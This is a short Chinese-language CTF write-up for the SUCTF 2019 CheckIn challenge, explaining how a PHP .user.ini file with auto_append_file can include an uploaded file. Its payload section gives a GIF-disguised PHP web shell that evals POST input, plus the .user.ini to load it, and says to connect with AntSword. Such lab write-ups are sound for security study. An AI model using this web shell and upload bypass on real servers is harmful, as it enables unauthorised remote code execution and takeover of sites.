# 原创
：  [SUCTF 2019]CheckIn

# [SUCTF 2019]CheckIn

#### [SUCTF 2019]CheckIn

## 考点

> 
.user.ini


## 思路

> 
`.user.ini`比`.htaccess`用的更广，nginx、apache、IIS，只要是以fastcgi运行的php都可以用这个方法，不像`.htaccess`有局限性，只能是apache<br/> `php.ini`是php默认的配置文件，其中包括了很多php的配置，分为几种：`PHP_INI_SYSTEM、PHP_INI_PERDIR、PHP_INI_ALL、PHP_INI_USER`


> 
`.user.ini`是一个能被动态加载的ini文件，修改了`.user.ini`后，不需要重启服务器中间件，只需要等待`user_ini.cache_ttl`所设置的时间（默认为300秒），即可被重新加载


> 
`auto_prepend_file`指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数；`auto_append_file`类似，只是在文件后面包含，使用时直接写在.user.ini中：


```
GIF89a
auto_prepend_file=01.gif

```

> 
所以我们先上传一个gif文件再上传一个.user.ini文件包含它


## Payload

> 
shell.gif文件内容


```
GIF89a
&lt;script language="php"&gt;
    if(@$_GET['shell']=='test'){
        phpinfo();
    }
    @eval($_POST[1]);
&lt;/script&gt;

```

> 
.user.ini内容


```
GIF89a
auto_append_file=shell.gif

```

> 
等生效后，用蚁剑连接即可


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623160407811.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210623160535949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
